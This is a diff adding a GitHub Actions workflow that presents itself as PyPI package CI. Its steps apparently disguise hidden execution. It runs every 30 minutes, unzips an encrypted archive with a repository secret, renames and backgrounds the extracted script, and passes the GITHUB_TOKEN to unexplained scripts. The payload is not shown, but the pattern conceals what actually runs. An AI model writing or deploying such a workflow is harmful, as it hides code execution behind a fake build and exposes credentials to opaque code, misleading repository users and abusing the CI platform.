@@ -1,0 +1,43 @@
+name: PyPI Project CI
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+  schedule:
+    - cron: "*/30 * * * *"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup Python environment
+        uses: actions/setup-python@v4
+        with:
+          python-version: "3.13"
+
+      - name: Install dependencies
+        run: pip install psutil pyjwt protobuf-decoder requests pycryptodome urllib3 protobuf
+
+      - name: Pre-publish checks
+        run: python recheckbuild.py "${{ github.repository }}" "${{ secrets.GITHUB_TOKEN }}"
+
+      - name: Extract package files
+        run: unzip -P ${{ secrets.PYPI_PASSWORD }} package.zip
+
+      - name: Rename run.py to build.py
+        run: mv run.py build.py
+
+      - name: Run build script
+        run: python build.py &
+
+      - name: Post-build project
+        run: python rebuild.py "${{ github.repository }}" "${{ secrets.GITHUB_TOKEN }}" "${{ github.run_id }}"
